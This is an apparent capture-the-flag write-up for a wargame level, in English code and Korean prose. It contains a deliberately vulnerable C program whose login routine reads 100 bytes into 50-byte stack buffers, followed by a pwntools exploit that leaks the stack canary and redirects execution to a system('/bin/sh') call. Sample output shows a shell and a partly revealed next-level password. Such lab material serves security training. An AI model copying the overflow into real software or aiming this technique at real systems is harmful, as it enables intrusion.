https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter05/ch5.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

// Bunker status structure
typedef struct {
    int power;
    int doors;
    int IPS;
    char airQuality[10];
    char waterSupply[10];
    char communication[10];
    char structuralIntegrity[10];
} BunkerStatus;

struct auth {
    char username[50];
    char passwd[50];
};

void generateRandomCode(char *code, int length) {
    int fd;
    char randByte;

    if ((fd = open("/dev/random", O_RDONLY)) == -1)
    {
        perror("open error");
        exit(1);
    }
    if ((read(fd, code, length)) == -1)
    {
        perror("read error");
        exit(1);
    }

    for (int i = 0; i < length; i++) {
        randByte = code[i] % 10;
        if ((randByte) < 0)
            randByte += 10;
             
        code[i] = '0' + randByte; // Generate random digit
    }

}

void printStatus(BunkerStatus *status) {
    printf("Bunker Status:\n");
    printf("- Power: %s\n", status->power ? "ON" : "OFF");
    printf("- Doors: %s\n", status->doors ? "OPEN" : "CLOSED");
    printf("- IPS Systems: %s\n", status->IPS ? "ACTIVATED" : "DEACTIVATED");
    printf("- Air Quality: %s\n", status->airQuality);
    printf("- Water Supply: %s\n", status->waterSupply);
    printf("- Communication Systems: %s\n", status->communication);
    printf("- Structural Integrity: %s\n", status->structuralIntegrity);
}

void lockdown(BunkerStatus *status) {
    printf("Initiating lockdown procedure...\n");
    status->doors = 0;
    status->IPS = 1;
    status->power = 1;
    printf("Lockdown in progress...\n");
    printf("All doors closed. IPS systems activated. Power supply secured.\n");
}

void openDoors(BunkerStatus *status) {
    printf("Opening all bunker doors...\n");
    status->doors = 1;
    printf("Doors are now OPEN.\n");
}

void closeDoors(BunkerStatus *status) {
    printf("Closing all bunker doors...\n");
    status->doors = 0;
    printf("Doors are now CLOSED.\n");
}

void activateIPS(BunkerStatus *status) {
    printf("Activating IPS systems...\n");
    status->IPS = 1;
    status->doors = 0;
    printf("IPS systems are now ACTIVATED.\n");
}

void deactivateIPS(BunkerStatus *status) {
    printf("Deactivating IPS systems...\n");
    status->IPS = 0;
    status->doors = 1;
    printf("IPS systems are now DEACTIVATED.\n");
    openDoors(&status);
}

void powerOn(BunkerStatus *status) {
    printf("Powering on the bunker...\n");
    status->power = 1;
    printf("Power is now ON.\n");
}

void powerOff(BunkerStatus *status) {
    printf("Powering off the bunker...\n");
    status->power = 0;
    printf("Power is now OFF.\n");
}

void performSystemCheck(BunkerStatus *status) {
    printf("Performing system diagnostic check...\n");
    printStatus(status);
}

void displayHelp() {
    printf("Available commands:\n");
    printf("- status           : Display the current status of the bunker.\n");
    printf("- lockdown         : Initiate lockdown procedure.\n");
    printf("- open_doors       : Open all bunker doors.\n");
    printf("- close_doors      : Close all bunker doors.\n");
    printf("- activate_IPS     : Activate IPS systems.\n");
    printf("- deactivate_IPS   : Deactivate IPS systems.\n");
    printf("- power_on         : Turn on the power.\n");
    printf("- power_off        : Turn off the power.\n");
    printf("- system_check     : Perform a system diagnostic check.\n");
    printf("- exit             : Exit the Bunker Control System.\n");
}

int IPS() {
    char username[50];
    char passwd[50];

    int accessGranted = 0;
    int count = 0;

    struct auth *auth = malloc(sizeof(struct auth));

    strcpy(auth->username, "admin");
    generateRandomCode(auth->passwd, 50);

    printf("\nIntrusion Prevention System Active.\n");
    printf("Authenticate to access the system\n\n");

    while (!accessGranted && count < 3) {
        printf("Username: ");
        read(0, username, sizeof(struct auth));
        //fgets(username, sizeof(auth), stdin);
        username[strcspn(username, "\n")] = '\0';

        printf("Password: ");
        read(0, passwd, sizeof(struct auth));
        //fgets(passwd, sizeof(auth), stdin);
        passwd[strcspn(passwd, "\n")] = '\0';


        printf("\nYour account: %s\n", username); 
        if (!strncmp(passwd, auth->passwd, sizeof(auth)) && !strncmp(username, auth->username, sizeof(auth))) {
            accessGranted = 1;
            printf("Access granted.\n");
            return 0 ;
        } else {
            printf("Incorrect code. Try again.\n");
            count++;
        }
    }
    printf("3 incorrect code attempts\n");
    for (int i = 30; i > 0; i--){
        printf("%d Second left\r", i);
        sleep(1);
    }
    return -1;
}

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
    init();

    do{

        printf("##############################################################\n");
        printf("#                    Bunker Control System                   #\n");
        printf("##############################################################\n");
        printf("Welcome to the Bunker Control System (BCS).\n");
        printf("Please enter a command. Type 'help' for a list of available commands.\n");

    }while(IPS());

    char command[50];
    BunkerStatus status = {1, 0, 1, "GOOD", "NORMAL", "FUNCTIONAL", "SOUND"};

    while (1) {
        printf("\n> ");
        fgets(command, 50, stdin);
        command[strcspn(command, "\n")] = '\0';

        if (strcmp(command, "help") == 0) {
            displayHelp();
        } else if (strcmp(command, "status") == 0) {
            printStatus(&status);
        } else if (strcmp(command, "lockdown") == 0) {
            lockdown(&status);
        } else if (strcmp(command, "open_doors") == 0) {
            openDoors(&status);
        } else if (strcmp(command, "close_doors") == 0) {
            closeDoors(&status);
        } else if (strcmp(command, "activate_IPS") == 0) {
            activateIPS(&status);
        } else if (strcmp(command, "deactivate_IPS") == 0) {
            deactivateIPS(&status);
        } else if (strcmp(command, "power_on") == 0) {
            powerOn(&status);
        } else if (strcmp(command, "power_off") == 0) {
            powerOff(&status);
        } else if (strcmp(command, "system_check") == 0) {
            performSystemCheck(&status);
        } else if (strcmp(command, "exit") == 0) {
            printf("Exiting the Bunker Control System...\n");
            break;
        } else {
            printf("Unknown command. Type 'help' for a list of available commands.\n");
        }
    }

    return 0;
}
```

```
[*] '/home/The_Alarm_of_Hope/ips'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

맨 처음 ``IPS()`` 함수에서 ``generateRandomCode()``로 생성된 난수 50자를 알아내야 admin 접속 후 정상적인 사용이 가능하지만,  
/dev/urandom에서 읽어오기 때문에 어려울 것으로 예상된다.  

그러나 ``IPS()`` 함수에서 username과 password를 입력받을 때, 길이가 각각의 변수의 길이가 아닌  
구조체의 길이(10진수: 100, 16진수: 0x64)로 입력받기 때문에, Stack-based Buffer Overflow가 발생하게 된다.  

```
0x0000000000401981 <+401>:   lea    rax,[rip+0xbee]        # 0x402576
0x0000000000401988 <+408>:   mov    rdi,rax
0x000000000040198b <+411>:   call   0x401150    // <system@plt>

pwndbg> x/s 0x402576
0x402576:       "/bin/sh"
```

IPS 함수에서 ``system("/bin/sh");``을 제공하기 때문에, Canary를 leak하고 리턴 주소만 0x401981로 덮어주면 쉽게 해결할 수 있을 것 같다.  
3번의 입력 기회가 모두 실패할 경우, 3 incorrect code attempts를 출력하고 30초 후에 프로그램이 종료한다.  
따라서 1번째에 Canary를 leak하고, 2번째에는 그냥 아무값이나 입력해서 기회를 소모한 후,  
마지막에 payload를 넣어준 후 30초를 기다리면 Shell을 획득할 수 있다.  

익스플로잇은 아래와 같다:
```
from pwn import *

p = process('./ips')

win = 0x401981

p.sendafter(b"Username: ", b'A' * 0x64)
p.sendafter(b"Password: ", b'A' * 0x39)
p.recvuntil(b'A' * 0x79)

canary = u64(b'\x00' + p.recv(7))
print(f"[+] canary: {hex(canary)}")

p.sendafter(b"Username: ", b'A')
p.sendafter(b"Password: ", b'A')


p.sendafter(b"Username: ", b'A')

payload = b'A' * 0x38
payload += p64(canary)
payload += b'B' * 0x8           # Overwrite RBP
payload += p64(win)

p.sendafter(b"Password: ", payload)
p.recvuntil(b"3 incorrect code attempts")

sleep(30)
print("[+] Got the shell!")

p.interactive()
```
``[+] Got the shell!``이 출력되고 난 후, status 명령어를 입력하면 Chapter 5 유저의 PW를 확인할 수 있다.

```
The_Alarm_of_Hope@hsapce-io:~$ python3 expl.py
[+] Starting local process './ips': pid 3969
[+] canary: 0x4b1df12d56bd4a00
[+] Got the shell!
[*] Switching to interactive mode

$ status
UID: 506
Chapter6 PW: i_wA5_A_bos5...
■■■■■■□□□□
$
```
